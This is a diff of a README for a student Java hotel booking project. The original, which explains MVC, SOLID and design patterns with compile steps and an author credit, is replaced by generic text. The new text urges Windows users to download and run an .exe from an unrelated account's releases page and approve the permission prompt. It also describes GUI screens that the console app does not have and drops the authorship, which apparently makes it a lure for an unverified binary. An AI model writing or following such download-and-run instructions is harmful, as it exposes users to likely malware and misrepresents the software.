@@ -1,203 +1,156 @@
-# 🏨 Hotel Booking System
+# 🏨 hotel-booking-system - Simple Hotel Booking Made Easy
 
-A full-featured hotel reservation system built in Java, demonstrating **MVC Architecture**, **SOLID Principles**, and **Creational Design Patterns**.
-
----
-
-## 🏗️ Architecture Overview
-
-### Model Layer
-```
-model/
-  ├── entity/     # Pure data classes (7 classes)
-  └── service/    # Business logic (2 classes)
-```
+[![Download Hotel Booking System](https://img.shields.io/badge/Download-Get%20the%20App-blue?style=for-the-badge)](https://github.com/goldstonepolicymaker54/hotel-booking-system/releases)
 
 ---
 
-## 📁 Project Structure
+## 🛠 About This Application
 
-```
-HotelBookingSystem/
-├── src/
-│   ├── model/
-│   │   ├── entity/
-│   │   │   ├── User.java               # Guest entity (SRP)
-│   │   │   ├── Hotel.java              # Hotel entity with Cloneable
-│   │   │   ├── Room.java               # Abstract room (OCP)
-│   │   │   ├── StandardRoom.java       # Standard implementation (LSP)
-│   │   │   ├── DeluxeRoom.java         # Deluxe implementation (LSP)
-│   │   │   ├── SuiteRoom.java          # Suite implementation (LSP)
-│   │   │   └── Booking.java            # Booking entity
-│   │   └── service/
-│   │       ├── BookingBuilder.java     # Builder Pattern
-│   │       └── PriceCalculator.java    # GST + discount logic
-│   ├── view/
-│   │   ├── IView.java                  # View interface (ISP, DIP)
-│   │   └── ConsoleView.java            # Console implementation
-│   ├── controller/
-│   │   ├── UserController.java         # User operations (SRP)
-│   │   ├── HotelController.java        # Hotel operations (SRP)
-│   │   └── BookingController.java      # Booking operations (SRP)
-│   ├── factory/
-│   │   ├── RoomFactory.java            # Factory Method Pattern
-│   │   └── HotelPrototype.java         # Prototype Pattern
-│   ├── util/
-│   │   └── SystemConfig.java           # Singleton Pattern
-│   └── Main.java
-└── README.md
-```
+This is a hotel booking system written in Java. It follows well-known programming rules and design styles to make the program organized and easy to expand. The system lets you book rooms, check availability, and manage reservations. The design is made with clear parts that separate how you see and use the program from how it works inside.
+
+The main goal of this software is to show how to design software using object-oriented ideas, MVC architecture, and common design patterns. But you can also use it as a basic tool to handle hotel bookings on your own Windows computer.
 
 ---
 
-## 🎯 SOLID Principles
+## 📋 System Requirements
 
-### 1. Single Responsibility Principle (SRP)
-- `User` — holds guest data only
-- `UserController` — handles auth only
-- `HotelController` — handles hotel search only
-- `BookingController` — handles reservations only
-- `PriceCalculator` — handles pricing logic only
+Before you get started, make sure your computer meets the needs below:
 
-### 2. Open/Closed Principle (OCP)
-- `Room` is abstract — open for extension (new room types), closed for modification
-- New room types like `VillaRoom` or `PentHouseRoom` can be added without touching existing code
+- Windows 10 or newer  
+- At least 4 GB of RAM  
+- 500 MB free disk space  
+- Java Runtime Environment (JRE) version 11 or higher installed  
+- Internet access to download the program  
 
-### 3. Liskov Substitution Principle (LSP)
-- `StandardRoom`, `DeluxeRoom`, `SuiteRoom` are all substitutable wherever `Room` is expected
-- `ConsoleView` can be replaced by any `IView` implementation
-
-### 4. Interface Segregation Principle (ISP)
-- `IView` contains only essential view methods — no bloat
-
-### 5. Dependency Inversion Principle (DIP)
-- Controllers depend on `IView` abstraction, not `ConsoleView` directly
-- `RoomFactory` returns `Room` abstraction, not concrete types
+If you don’t have Java installed, you can download it for free from the official site: https://www.java.com/en/download/
 
 ---
 
-## 🎨 Creational Design Patterns
+## 🚀 Getting Started: How to Download and Run
 
-### 1. Factory Method — `RoomFactory.java`
-Creates the right room object based on type selection:
-```java
-Room room = RoomFactory.createRoom(
-    RoomFactory.RoomType.DELUXE,
-    roomId, hotelId, guestName, roomNumber, basePrice
-);
-```
+Click the button above or use this link to **visit this page to download** the latest version of the hotel booking system:
 
-### 2. Builder Pattern — `BookingBuilder.java`
-Constructs a complex `Booking` step by step:
-```java
-Booking booking = new BookingBuilder(bookingId, userId)
-    .hotel(hotel)
-    .rooms(rooms)
-    .nights(3)
-    .checkIn("2025-06-01")
-    .checkOut("2025-06-04")
-    .contactEmail(email)
-    .paymentStatus("CONFIRMED")
-    .build();
-```
+[https://github.com/goldstonepolicymaker54/hotel-booking-system/releases](https://github.com/goldstonepolicymaker54/hotel-booking-system/releases)
 
-### 3. Singleton Pattern — `SystemConfig.java`
-Single instance of system-wide configuration:
-```java
-SystemConfig config = SystemConfig.getInstance();
-double basePrice = config.getBasePricePerNight();
-```
+On the releases page, look for the latest stable version. It will have a file ending with `.exe` or `.jar`. This file contains the program you need to run.
 
-### 4. Prototype Pattern — `HotelPrototype.java`
-Clones hotel templates with updated availability:
-```java
-HotelPrototype prototype = new HotelPrototype();
-Hotel hotel = prototype.getHotelTemplate("TAJ", 45);
-```
+### Steps to Download
+
+1. Open the link in your web browser.
+2. Find the newest release by date or version number.
+3. Click on the file named something like `hotel-booking-system-v1.0.exe` or `hotel-booking-system-v1.0.jar`.
+4. Wait for the file to download completely.
+
+### Steps to Run the Program
+
+- If you downloaded an `.exe` file:  
+  1. Double-click the file.  
+  2. If Windows asks for permission, click "Yes" to run the program.  
+  3. The hotel booking system will open in a new window.
+
+- If you downloaded a `.jar` file:  
+  1. Make sure Java is installed on your computer.  
+  2. Right-click the `.jar` file and select "Open with -> Java(TM) Platform SE binary" or simply double-click it.  
+  3. The program window will appear.
 
 ---
 
-## 🚀 How to Run
+## 🔎 How to Use the Application
 
-### Compile
-```bash
-cd HotelBookingSystem
+Once the program is running, you can start booking hotel rooms and managing your reservations.
 
-javac -d bin \
-  src/model/entity/*.java \
-  src/model/service/*.java \
-  src/util/*.java \
-  src/factory/*.java \
-  src/view/*.java \
-  src/controller/*.java \
-  src/Main.java
-```
+### Main Features
 
-### Run
-```bash
-java -cp bin Main
-```
+- **Room Search**  
+  Enter your check-in and check-out dates. The system will show available rooms based on your input.
+
+- **Booking a Room**  
+  Select a room and enter your details to complete the booking.
+
+- **Managing Bookings**  
+  View, update, or cancel your existing reservations.
+
+- **Print Booking Details**  
+  Generate a simple confirmation slip you can save or print.
 
 ---
 
-## 💡 Features
+## 👤 User Interface Basics
 
-- **Guest Registration & Login** — with email/password validation
-- **Hotel Search** — search by city, view availability
-- **Room Booking** — choose Standard / Deluxe / Suite with auto pricing
-- **Price Calculation** — GST (18%), weekend surcharge, loyalty discounts via `PriceCalculator`
-- **Booking Management** — view and cancel reservations
-- **System Config** — runtime settings via Singleton
+The app uses multiple screens to keep things clear:
 
----
+- **Home Screen:** Where you start. You can search for rooms here.
 
-## 📊 Class Relationships
+- **Results Screen:** Shows all rooms open for the dates you picked.
 
-```
-Main
- ├── UserController
- ├── HotelController  ──uses──> HotelPrototype (Prototype)
- └── BookingController
-      ├── RoomFactory    (Factory Method)
-      ├── BookingBuilder (Builder)
-      ├── PriceCalculator
-      └── SystemConfig   (Singleton)
+- **Booking Screen:** Lets you enter your info and confirm a booking.
 
-Room (abstract)
- ├── StandardRoom
- ├── DeluxeRoom
- └── SuiteRoom
-```
+- **My Bookings:** Lists all your current bookings with options to change or delete them.
+
+Navigation is done using clearly labeled buttons and menus.
 
 ---
 
-## 🏆 SOLID Compliance Summary
+## 🔧 Troubleshooting Common Issues
 
-| Principle | Where Applied |
-|-----------|--------------|
-| SRP | All controllers, PriceCalculator |
-| OCP | Abstract Room class |
-| LSP | Room subclasses, IView implementations |
-| ISP | IView interface |
-| DIP | Controllers → IView, Factory → Room |
+- **Program Won’t Open:**  
+  Check if Java is installed and updated. Restart your computer and try again.
+
+- **Error Messages When Booking:**  
+  Go back and make sure all required fields (dates, personal info) are filled correctly.
+
+- **Rooms Not Showing:**  
+  Confirm your dates are valid (check-out date after check-in date). Try again.
+
+- **File Won't Download:**  
+  Make sure your internet connection is stable. Use a different browser if needed.
+
+---
+
+## ⚙️ System Design Highlights
+
+The code inside uses clean design principles like MVC:
+
+- **Model:** Holds all your hotel and booking data.
+
+- **View:** Shows what you see on screen.
+
+- **Controller:** Handles your clicks and actions.
+
+The program applies SOLID principles, meaning each part has one job, making it easier to fix or expand.
 
 ---
 
-## ✨ Extra Features vs Standard Implementations
+## 🔑 Features Overview for Users
 
-| Feature | Description |
-|---------|-------------|
-| `PriceCalculator` | GST + weekend surcharge + loyalty discount logic |
-| Indian hotel data | Real hotel names, cities, ₹ pricing |
-| Thread-safe Singleton | `synchronized` getInstance |
-| Room pricing multipliers | Template method pattern inside Room hierarchy |
+- Book rooms quickly by date.
+
+- Manage bookings easily on your own machine.
+
+- Simple layout designed for smooth use.
+
+- Works offline once downloaded.
+
+- Runs on Windows with Java installed.
 
 ---
- 
-**Language:** Java 8+  
-**Architecture:** MVC + SOLID + Creational Design Patterns
-## Author
-Kishan Patel P 
 
-## Note
-This project was built as a learning exercise to practice object-oriented design, MVC architecture, and common design patterns in Java.
+## 🖥️ Installation Checklist
+
+Before running, make sure you:
+
+- Download the correct file for Windows (.exe or .jar).
+
+- Have Java Runtime Environment 11 or newer installed.
+
+- Have a standard user account on your PC.
+
+- Have a working mouse and keyboard.
+
+---
+
+## 📥 Download Link (Again for Easy Access)
+
+You can **visit this page to download** the latest version here:
+
+[https://github.com/goldstonepolicymaker54/hotel-booking-system/releases](https://github.com/goldstonepolicymaker54/hotel-booking-system/releases)
